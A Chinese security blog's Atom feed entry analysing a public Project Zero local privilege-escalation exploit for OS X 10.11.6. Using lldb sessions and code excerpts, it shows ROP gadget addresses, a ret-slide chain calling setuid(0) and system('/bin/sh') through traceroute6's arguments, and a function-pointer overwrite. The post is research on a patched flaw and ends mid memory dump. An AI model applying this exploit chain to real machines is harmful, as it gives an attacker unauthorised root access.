<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[mrh的学习分享]]></title>
  <subtitle><![CDATA[胸口写一个勇字]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="http://turingh.github.io/"/>
  <updated>2016-10-29T02:45:36.000Z</updated>
  <id>http://turingh.github.io/</id>
  
  <author>
    <name><![CDATA[mrh]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[XNU内核中task_t相关漏洞分析笔记(Part I)]]></title>
    <link href="http://turingh.github.io/2016/10/28/task-t-considered-harmfull-analysis-P1/"/>
    <id>http://turingh.github.io/2016/10/28/task-t-considered-harmfull-analysis-P1/</id>
    <published>2016-10-28T20:09:25.000Z</published>
    <updated>2016-10-29T02:45:36.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>​    前两天<a href="https://googleprojectzero.blogspot.com/" target="_blank" rel="external">Project Zero</a>的blog上面，Ian Beer发表了一篇新的文章，讨论了在<code>xnu</code> 的内核在设计上存在的一个问题，从而可以导致提权，沙箱逃逸等一洗了的问题。并且提供了相应的的POC与EXP源码。这篇文章是调试与分析其中第一个漏洞的部分记录。</p>
<p><a href="https://googleprojectzero.blogspot.com/2016/10/taskt-considered-harmful.html" target="_blank" rel="external">task_t considered harmful</a></p>
<p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=831&amp;can=1&amp;q=apple&amp;sort=-id" target="_blank" rel="external">OS X/iOS kernel use-after-free in IOSurface</a></p>
<a id="more"></a>
<h1 id="0x01_准备工作">0x01 准备工作</h1><h2 id="1-1_基础知识">1.1 基础知识</h2><p>​    在阅读本文之前，需要稍微了解一下<code>mach_msg</code>相关的知识，以及一些使用<code>mach_msg</code>的技巧，理解父进程与子进程交换<code>port</code>之后可以做一些操作。</p>
<ul>
<li><a href="http://turingh.github.io/2016/07/05/%E5%86%8D%E7%9C%8BCVE-2016-1757%E6%B5%85%E6%9E%90mach%20message%E7%9A%84%E4%BD%BF%E7%94%A8/">再看CVE-2016-1757—浅析mach message的使用</a></li>
<li><a href="https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html" target="_blank" rel="external">Changes to XNU Mach IPC</a></li>
</ul>
<h2 id="1-2_调试环境">1.2 调试环境</h2><p>​    本文的<code>EXP</code>的运行环境是<code>OS X 10.11.6</code>。使用的虚拟机软件是parallels desktop</p>
<h2 id="0x02_漏洞成因">0x02 漏洞成因</h2><p>​    <a href="https://googleprojectzero.blogspot.com/2016/10/taskt-considered-harmful.html" target="_blank" rel="external">task_t considered harmful</a>这篇已经说的很清楚了。这幅图大致反应出整个流程。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/task_t_analysis/EXP_flow.png" alt="exploit执行流程"></p>
<h1 id="0x03_Exploit调试">0x03 Exploit调试</h1><p>对理解整个<code>exploit</code>关键的几个点进行调试。</p>
<h2 id="3-1_setup_payload_and_offsets">3.1 setup_payload_and_offsets</h2><p>首先通过<code>memmem</code>函数在<code>libsystem_c.dylib</code>中找到几个相应的<code>ROP</code>组件。</p>
<ul>
<li>ret指令所在地址<code>0x7fff8fe520d5</code>。</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) dis -s    ret&#10;libsystem_c.dylib`strcpy:&#10;    0x7fff8fe520d5 &#60;+85&#62;:  ret&#10;    0x7fff8fe520d6 &#60;+86&#62;:  movdqu xmm0, xmmword ptr [rsi + rcx]&#10;    0x7fff8fe520db &#60;+91&#62;:  movdqu xmmword ptr [rdi], xmm0</span><br></pre></td></tr></table></figure>
<ul>
<li>pop_rdi_ret指令所在地址<code>0x7fff8fe8a213</code>。</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) dis -s pop_rdi_ret&#10;libsystem_c.dylib`addr2ascii:&#10;    0x7fff8fe8a213 &#60;+116&#62;: pop    rdi&#10;    0x7fff8fe8a214 &#60;+117&#62;: ret&#10;    0x7fff8fe8a215 &#60;+118&#62;: add    al, 0x0</span><br></pre></td></tr></table></figure>
<ul>
<li>stack_shift_gadget指令所在地址<code>0x7fff8fed1cec</code></li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) dis -s stack_shift_gadget&#10;libsystem_c.dylib`realpath$DARWIN_EXTSN:&#10;    0x7fff8fed1cec &#60;+1935&#62;: add    rsp, 0x1d88&#10;    0x7fff8fed1cf3 &#60;+1942&#62;: pop    rbx&#10;    0x7fff8fed1cf4 &#60;+1943&#62;: pop    r12&#10;    0x7fff8fed1cf6 &#60;+1945&#62;: pop    r13&#10;    0x7fff8fed1cf8 &#60;+1947&#62;: pop    r14&#10;    0x7fff8fed1cfa &#60;+1949&#62;: pop    r15&#10;    0x7fff8fed1cfc &#60;+1951&#62;: pop    rbp&#10;    0x7fff8fed1cfd &#60;+1952&#62;: ret</span><br></pre></td></tr></table></figure>
<p>因为<code>traceroute6</code>的栈足够长，所以<code>exploit</code>将<code>payload</code>就放在栈上，通过<code>stack_shift_gadget</code>跳到一串连续的<code>ret</code>的<code>gadget</code>处，从而触发提权代码的执行。</p>
<p>在args_u64的<code>ROP</code>栈处理好之后，内存布局如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) memory read -size 8  -format x -c100 args_u64&#10;0x101000000: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x101000010: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x101000020: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x101000030: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x101000040: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x101000050: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x101000060: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x101000070: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x101000080: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x101000090: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x1010000a0: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x1010000b0: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x1010000c0: 0x00007fff8fe520d5 0x00007fff8fe520d5</span><br></pre></td></tr></table></figure>
<p>可以看到<code>0x00007fff8fe520d5</code>就是<code>ret</code>的 <code>gad_get</code>的地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">383</span>   <span class="comment">// ret-slide</span></span><br><span class="line"><span class="number">384</span>   <span class="keyword">int</span> i;</span><br><span class="line"><span class="number">385</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ret_slide_length; i++) &#123;</span><br><span class="line"><span class="number">386</span>     args_u64[i] = ret;</span><br><span class="line"><span class="number">387</span>   &#125;</span><br><span class="line"><span class="number">388</span></span><br><span class="line"><span class="number">389</span>   args_u64[i] = pop_rdi_ret;</span><br><span class="line"><span class="number">390</span>   args_u64[i+<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="number">391</span>   args_u64[i+<span class="number">2</span>] = (<span class="keyword">uint8_t</span>*)&amp;setuid;</span><br><span class="line"><span class="number">392</span>   args_u64[i+<span class="number">3</span>] = pop_rdi_ret;</span><br><span class="line"><span class="number">393</span>   args_u64[i+<span class="number">4</span>] = bin_sh;</span><br><span class="line"><span class="number">394</span>   args_u64[i+<span class="number">5</span>] = (<span class="keyword">uint8_t</span>*)&amp;system;</span><br></pre></td></tr></table></figure>
<p>在执行389-394行之后，最后的<code>stack</code>内存的布局如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) p/x i&#10;(int) $32 = 0x00000102&#10;(lldb) p &#38;args_u64[0x102]&#10;(uint8_t **) $30 = 0x0000000101000810&#10;&#10;(lldb) memory read -size 8 -format x -count 30 0x0000000101000790&#10;0x101000790: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x1010007a0: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x1010007b0: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x1010007c0: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x1010007d0: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x1010007e0: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x1010007f0: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x101000800: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x101000810: 0x00007fff8fe8a213 0x0000000000000000&#10;0x101000820: 0x00007fff8a183628 0x00007fff8fe8a213&#10;0x101000830: 0x00007fff8fedb69e 0x00007fff8fed0e0b&#10;0x101000840: 0x0000000000000000 0x0000000000000000&#10;0x101000850: 0x0000000000000000 0x0000000000000000&#10;0x101000860: 0x0000000000000000 0x0000000000000000&#10;0x101000870: 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>可以看到<code>0x101000800</code>之前都是用<code>ret</code>的<code>gad_get</code>填充的，从<code>0x101000810</code>开始是伪造的调用栈的结构。大致如下图所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/*			args</span><br><span class="line">   * 		+-------------------+</span><br><span class="line">   * 		|   ret             | +---------+</span><br><span class="line">   * 		+-------------------+           |</span><br><span class="line">   * 		|   ret             |		 0x101个</span><br><span class="line">   * 		+-------------------+           |</span><br><span class="line">   * 		|   ret             | +---------+</span><br><span class="line">   *  		+-------------------+</span><br><span class="line">   * 		|   pop_rdi_ret     |</span><br><span class="line">   * 		+-------------------+</span><br><span class="line">   * 		|   0               |</span><br><span class="line">   * 		+-------------------+</span><br><span class="line">   * 		|   setuid          |</span><br><span class="line">   * 		+-------------------+</span><br><span class="line">   * 		|   pop_rdi_ret     |</span><br><span class="line">   * 		+-------------------+</span><br><span class="line">   * 		|   bin_sh          |</span><br><span class="line">   * 		+-------------------+</span><br><span class="line">   * 		|   system          |</span><br><span class="line">   * 		+-------------------+</span><br><span class="line">   *		</span><br><span class="line">*/</span></span><br></pre></td></tr></table></figure>
<p><code>ROP</code>的逻辑很简单，通过跳转到上面任意一个<code>ret</code>，就会执行setuid(0),并且创建一个具有<code>root</code>权限的<code>shell</code>。通过<code>execve</code>调用<code>traceroute6</code>的时候需要将这一段并到<code>execve</code>的参数上面去。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">398</span>   <span class="keyword">size_t</span> argv_allocation_size = (ret_slide_length+<span class="number">100</span>)*<span class="number">8</span>*<span class="number">8</span>;</span><br><span class="line"><span class="number">399</span>   <span class="keyword">char</span>** target_argv = <span class="built_in">malloc</span>(argv_allocation_size);</span><br><span class="line"><span class="number">400</span>   <span class="built_in">memset</span>(target_argv, <span class="number">0</span>, argv_allocation_size);</span><br><span class="line"><span class="number">401</span>   target_argv[<span class="number">0</span>] = progname;</span><br><span class="line"><span class="number">402</span>   target_argv[<span class="number">1</span>] = optname;</span><br><span class="line"><span class="number">403</span>   target_argv[<span class="number">2</span>] = optval;</span><br><span class="line"><span class="number">404</span>   <span class="keyword">int</span> argn = <span class="number">3</span>;</span><br><span class="line"><span class="number">405</span>   target_argv[argn++] = &amp;args[<span class="number">0</span>];</span><br><span class="line"><span class="number">406</span>   <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; target_argv_rop_size; i++) &#123;</span><br><span class="line"><span class="number">407</span>     <span class="keyword">if</span> (args[i-<span class="number">1</span>] == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">408</span>       target_argv[argn++] = &amp;args[i];</span><br><span class="line"><span class="number">409</span>     &#125;</span><br><span class="line"><span class="number">410</span>   &#125;</span><br><span class="line"><span class="number">411</span>   target_argv[argn] = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
<p>最后<code>target_argv</code>的结构大致如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line">  *  		+-------------------+</span><br><span class="line">  * 		|   progname        |</span><br><span class="line">  * 		+-------------------+</span><br><span class="line">  * 		|   optname         |</span><br><span class="line">  * 		+-------------------+</span><br><span class="line">  * 		|   optval          |</span><br><span class="line">  * 		+-------------------+</span><br><span class="line">  * 		|   &amp;arg[0]         |</span><br><span class="line">  * 		+-------------------+</span><br><span class="line">  * 		|   &amp;arg[1]         |</span><br><span class="line">  * 		+-------------------+</span><br><span class="line">  * 		|   &amp;arg[2]         |</span><br><span class="line">  * 		+-------------------+</span><br><span class="line">  * 		|   ...             |</span><br><span class="line">  * 		+-------------------+</span><br><span class="line">  * 		|   &amp;arg[n]         |</span><br><span class="line">  * 		+-------------------+</span><br><span class="line">  * 		|   NULL            |</span><br><span class="line">  * 		+-------------------+</span><br><span class="line">  */</span></span><br></pre></td></tr></table></figure>
<h2 id="3-2_do_parent">3.2 do_parent</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">598</span>   <span class="comment">//overwrite the fptr value:</span></span><br><span class="line"><span class="number">599</span>   *(<span class="keyword">uint64_t</span>*)(shared_page+fptr_offset) = stack_shift_gadget;</span><br></pre></td></tr></table></figure>
<p><code>do_parent</code>的这一行代码修改了<code>__clean</code>处的地址。</p>
<p>在执行599行之前观察。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(lldb) p/x *(<span class="keyword">uint64_t</span>*)(shared_page+fptr_offset)</span><br><span class="line">(<span class="keyword">uint64_t</span>) $<span class="number">34</span> = <span class="number">0x00007fff8fe8e61d</span></span><br><span class="line">(lldb) dis -s <span class="number">0x00007fff8fe8e61d</span></span><br><span class="line">libsystem_c.dylib`_cleanup:</span><br><span class="line">    <span class="number">0x7fff8fe8e61d</span> &lt;+<span class="number">0</span>&gt;:  push   rbp</span><br><span class="line">    <span class="number">0x7fff8fe8e61e</span> &lt;+<span class="number">1</span>&gt;:  mov    rbp, rsp</span><br><span class="line">    <span class="number">0x7fff8fe8e621</span> &lt;+<span class="number">4</span>&gt;:  mov    rdi, qword ptr [rip - <span class="number">0x1c95c588</span>] ; (<span class="keyword">void</span> *)<span class="number">0x00007fff8fe8d6ce</span>: __sflush</span><br><span class="line">    <span class="number">0x7fff8fe8e628</span> &lt;+<span class="number">11</span>&gt;: pop    rbp</span><br><span class="line">    <span class="number">0x7fff8fe8e629</span> &lt;+<span class="number">12</span>&gt;: jmp    <span class="number">0x7fff8fed6c6c</span>            ; symbol stub <span class="keyword">for</span>: _fwalk</span><br></pre></td></tr></table></figure>
<p>在执行了<code>overwrite</code>之后的内存如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(lldb) p/x *(<span class="keyword">uint64_t</span>*)(shared_page+fptr_offset)</span><br><span class="line">(<span class="keyword">uint64_t</span>) $<span class="number">36</span> = <span class="number">0x00007fff8fed1cec</span></span><br><span class="line">(lldb) dis -s <span class="number">0x00007fff8fed1cec</span></span><br><span class="line">libsystem_c.dylib`realpath$DARWIN_EXTSN:</span><br><span class="line">    <span class="number">0x7fff8fed1cec</span> &lt;+<span class="number">1935</span>&gt;: add    rsp, <span class="number">0x1d88</span></span><br><span class="line">    <span class="number">0x7fff8fed1cf3</span> &lt;+<span class="number">1942</span>&gt;: pop    rbx</span><br><span class="line">    <span class="number">0x7fff8fed1cf4</span> &lt;+<span class="number">1943</span>&gt;: pop    r12</span><br><span class="line">    <span class="number">0x7fff8fed1cf6</span> &lt;+<span class="number">1945</span>&gt;: pop    r13</span><br><span class="line">    <span class="number">0x7fff8fed1cf8</span> &lt;+<span class="number">1947</span>&gt;: pop    r14</span><br><span class="line">    <span class="number">0x7fff8fed1cfa</span> &lt;+<span class="number">1949</span>&gt;: pop    r15</span><br><span class="line">    <span class="number">0x7fff8fed1cfc</span> &lt;+<span class="number">1951</span>&gt;: pop    rbp</span><br><span class="line">    <span class="number">0x7fff8fed1cfd</span> &lt;+<span class="number">1952</span>&gt;: ret</span><br><span class="line">    <span class="number">0x7fff8fed1cfe</span> &lt;+<span class="number">1953</span>&gt;: call   <span class="number">0x7fff8fed5fdc</span>            ; symbol stub <span class="keyword">for</span>: __error</span><br><span class="line">    <span class="number">0x7fff8fed1d03</span> &lt;+<span class="number">1958</span>&gt;: mov    dword ptr [rax], <span class="number">0x3e</span></span><br></pre></td></tr></table></figure>
<h2 id="3-3_traceroute6">3.3 traceroute6</h2><p>要调试<code>execve</code>启动的<code>traceroute6</code>，先通过<code>lldb</code>启动<code>surfacer00t_10_11_6</code>，对<code>fork</code>下断点。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) b fork&#10;Breakpoint 6: where = libsystem_c.dylib`fork, address = 0x00007fff8fe60f70</span><br></pre></td></tr></table></figure>
<p>执行到<code>fork</code>后会停下来。</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">*</span> thread <span class="comment">#1: tid = 0x6e32, 0x00007fff8fe60f70 libsystem_c.dylib`fork, queue = 'com.apple.main-thread', stop reason = breakpoint 6.1</span></span><br><span class="line">    frame <span class="comment">#0: 0x00007fff8fe60f70 libsystem_c.dylib`fork</span></span><br><span class="line">libsystem_c.dylib`fork:</span><br><span class="line">-&gt;  0x7fff8fe60f70 <span class="variable">&lt;+0&gt;</span>: push   rbp</span><br><span class="line">    0x7fff8fe60f71 <span class="variable">&lt;+1&gt;</span>: mov    rbp, rsp</span><br><span class="line">    0x7fff8fe60f74 <span class="variable">&lt;+4&gt;</span>: push   rbx</span><br><span class="line">    0x7fff8fe60f75 <span class="variable">&lt;+5&gt;</span>: push   rax</span><br></pre></td></tr></table></figure>
<p>这个时候启动另外一个<code>lldb</code>进程，这个<code>lldb</code>要用<code>sudo</code>启动，否则会无法<code>attach</code>。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) process attach -name traceroute6 -waitfor</span><br></pre></td></tr></table></figure>
<p>通过这条指令，等待<code>traceroute6</code>执行。同时继续执行<code>fork</code>的<code>lldb</code>。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(lldb) process attach -name traceroute6 -waitfor</span><br><span class="line">There is a running process, detach from it and attach?: [Y/n]</span><br><span class="line">Process 569 detached</span><br><span class="line">Process 580 stopped</span><br><span class="line">* thread #1: tid = 0x7244, 0x00007fff8a182612 libsystem_kernel.dylib`__write_nocancel + 10, queue = 'com.apple.main-thread', stop reason = signal SIGSTOP</span><br><span class="line">    frame #0: 0x00007fff8a182612 libsystem_kernel.dylib`__write_nocancel + 10</span><br><span class="line">libsystem_kernel.dylib`__write_nocancel:</span><br><span class="line">-&gt;  0x7fff8a182612 &lt;+10&gt;: jae    0x7fff8a18261c            ; &lt;+20&gt;</span><br><span class="line">    0x7fff8a182614 &lt;+12&gt;: movq   %rax, %rdi</span><br><span class="line">    0x7fff8a182617 &lt;+15&gt;: jmp    0x7fff8a17c7cd            ; cerror_nocancel</span><br><span class="line">    0x7fff8a18261c &lt;+20&gt;: retq</span><br></pre></td></tr></table></figure>
<p>就可以调试<code>ROP</code>的执行过程。</p>
<p>有一点要注意，除了要<code>sudo</code>启动第二个<code>lldb</code>之外，系统还需要关闭<code>SIP</code>，但是在Parallels Desktop中进入OS X的恢复模式，有点奇特。并不是command+R。</p>
<blockquote>
<h2 id="Information">Information</h2><p>This article describes how to boot into your OS X virtual machine’s Recovery Mode on Parallels Desktop.</p>
<ol>
<li>Start Parallels Desktop but do not start your virtual machine.</li>
<li>Open virtual machine’s <a href="http://kb.parallels.com/5164" target="_blank" rel="external">configuration window</a> -&gt; <strong>Hardware</strong> -&gt; <strong>Boot Order</strong>.</li>
<li>Enable <strong>Select boot device on startup</strong> option and close configuration window.</li>
<li>Start your OS X virtual machine, click on the virtual machine window to make it grab the focus and press any key when prompted:</li>
<li>On the <strong>Boot Manager</strong> window choose <strong>Mac OS X Recovery</strong>:</li>
</ol>
</blockquote>
<p>也可以看<a href="http://kb.parallels.com/cn/116526" target="_blank" rel="external">这里</a>。</p>
<p>通过查看<code>__cleanup</code>处的汇编代码可以看到函数已经被替换了。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) p __cleanup&#10;(void *) $0 = 0x00007fff8fed1cec&#10;(lldb) dis -s __cleanup&#10;libsystem_c.dylib`realpath$DARWIN_EXTSN:&#10;    0x7fff8fed1cec &#60;+1935&#62;: addq   $0x1d88, %rsp             ; imm = 0x1D88&#10;    0x7fff8fed1cf3 &#60;+1942&#62;: popq   %rbx&#10;    0x7fff8fed1cf4 &#60;+1943&#62;: popq   %r12&#10;    0x7fff8fed1cf6 &#60;+1945&#62;: popq   %r13&#10;    0x7fff8fed1cf8 &#60;+1947&#62;: popq   %r14&#10;    0x7fff8fed1cfa &#60;+1949&#62;: popq   %r15&#10;    0x7fff8fed1cfc &#60;+1951&#62;: popq   %rbp&#10;    0x7fff8fed1cfd &#60;+1952&#62;: retq&#10;    0x7fff8fed1cfe &#60;+1953&#62;: callq  0x7fff8fed5fdc            ; symbol stub for: __error&#10;    0x7fff8fed1d03 &#60;+1958&#62;: movl   $0x3e, (%rax)</span><br></pre></td></tr></table></figure>
<p>可以对这里打断点后释放，就会执行到我们的栈上跳转的代码。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(lldb) b *0x00007fff8fed1cec</span><br><span class="line">Breakpoint 1: where = libsystem_c.dylib`realpath$DARWIN_EXTSN + 1935, address = 0x00007fff8fed1cec</span><br><span class="line">(lldb) c</span><br><span class="line">Process 580 resuming</span><br><span class="line">Process 580 stopped</span><br><span class="line">* thread #1: tid = 0x7244, 0x00007fff8fed1cec libsystem_c.dylib`realpath$DARWIN_EXTSN + 1935, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1</span><br><span class="line">    frame #0: 0x00007fff8fed1cec libsystem_c.dylib`realpath$DARWIN_EXTSN + 1935</span><br><span class="line">libsystem_c.dylib`realpath$DARWIN_EXTSN:</span><br><span class="line">-&gt;  0x7fff8fed1cec &lt;+1935&gt;: addq   $0x1d88, %rsp             ; imm = 0x1D88</span><br><span class="line">    0x7fff8fed1cf3 &lt;+1942&gt;: popq   %rbx</span><br><span class="line">    0x7fff8fed1cf4 &lt;+1943&gt;: popq   %r12</span><br><span class="line">    0x7fff8fed1cf6 &lt;+1945&gt;: popq   %r13</span><br></pre></td></tr></table></figure>
<p>观察<code>$rsp</code>寄存器</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">(lldb) <span class="keyword">register</span> read</span><br><span class="line">General Purpose Registers:</span><br><span class="line">       rax = <span class="number">0x00007fff8fed1cec</span>  libsystem_c.dylib`realpath$DARWIN_EXTSN + <span class="number">1935</span></span><br><span class="line">       rbx = <span class="number">0x0000000000000001</span></span><br><span class="line">       rcx = <span class="number">0x0000050000000000</span></span><br><span class="line">       rdx = <span class="number">0x00007fff735360d0</span>  atexit_mutex + <span class="number">32</span></span><br><span class="line">       rdi = <span class="number">0x00007fff735360b0</span>  atexit_mutex</span><br><span class="line">       rsi = <span class="number">0x0000050000000500</span></span><br><span class="line">       rbp = <span class="number">0x00007fff523dcc70</span></span><br><span class="line">       rsp = <span class="number">0x00007fff523dcc58</span></span><br><span class="line">        r8 = <span class="number">0x00000000fffffffc</span></span><br><span class="line">        r9 = <span class="number">0x00007fff735360c8</span>  atexit_mutex + <span class="number">24</span></span><br><span class="line">       r10 = <span class="number">0x00000000ffffffff</span></span><br><span class="line">       r11 = <span class="number">0xffffffff00000000</span></span><br><span class="line">       r12 = <span class="number">0x0000000000000219</span></span><br><span class="line">       r13 = <span class="number">0x000000010d823818</span>  traceroute6`___lldb_unnamed_function1$$traceroute6 + <span class="number">4828</span></span><br><span class="line">       r14 = <span class="number">0x00007fff523dd610</span></span><br><span class="line">       r15 = <span class="number">0x00007fff735372a0</span>  optarg</span><br><span class="line">       rip = <span class="number">0x00007fff8fed1cec</span>  libsystem_c.dylib`realpath$DARWIN_EXTSN + <span class="number">1935</span></span><br><span class="line">    rflags = <span class="number">0x0000000000000202</span></span><br><span class="line">        cs = <span class="number">0x000000000000002b</span></span><br><span class="line">        fs = <span class="number">0x0000000000000000</span></span><br><span class="line">        gs = <span class="number">0x0000000000000000</span></span><br><span class="line">        </span><br><span class="line">(lldb) memory read -size <span class="number">8</span> -format x -count <span class="number">100</span>  <span class="number">0x00007fff523dcc58</span>+<span class="number">0x1d88</span></span><br><span class="line"><span class="number">0x7fff523de9e0</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523de9f0</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523dea00</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523dea10</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523dea20</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523dea30</span>: <span class="number">0x00007fff8fe520d5</span> 